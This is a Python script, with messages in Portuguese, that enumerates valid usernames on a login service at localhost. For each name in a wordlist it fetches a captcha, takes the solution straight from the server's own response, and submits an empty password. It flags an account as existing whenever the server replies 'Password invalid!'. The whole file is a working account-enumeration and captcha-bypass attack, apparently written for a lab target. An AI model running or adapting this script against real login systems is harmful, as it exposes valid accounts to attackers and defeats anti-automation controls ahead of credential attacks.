import requests
import sys
import json
import argparse

def get_captcha():
    try:
        response = requests.get("http://localhost:443/captcha")
        response.raise_for_status()
        data = response.json()
        return data['captcha_solution'], data['captcha_id']
    except requests.exceptions.RequestException as e:
        print("Erro ao obter o captcha:", e)
        sys.exit(1)

def authenticate(username, password, solution, captcha_id):
    try:
        headers = {'Content-Type': 'application/json'}
        payload = json.dumps({
            "username": username,
            "password": password,
            "captcha_id": captcha_id,
            "captcha_solution": solution
        })
        response = requests.request("POST", "http://localhost:443/authenticate", headers=headers, data=payload)
        return response.json()
    except requests.exceptions.RequestException as e:
        print(e)
        print("Erro ao autenticar, username: %s e password: %s" % (username, password))

def main():
    parser = argparse.ArgumentParser(description="Script de autenticação com lista de usuários.")
    parser.add_argument("-l", "--list", type=str, help="Arquivo contendo a lista de usuários")
    args = parser.parse_args()

    if not args.list:
        parser.print_help()
        sys.exit(1)

    users_filename = args.list

    with open(users_filename, 'r') as users_file:
        for user in users_file:
            solution, captcha_id = get_captcha()
            result = authenticate(user.strip(), "", solution, captcha_id)
            if result.get('message') == "Password invalid!":
                print("Usuário encontrado: ", user.strip())

if __name__ == "__main__":
    main()
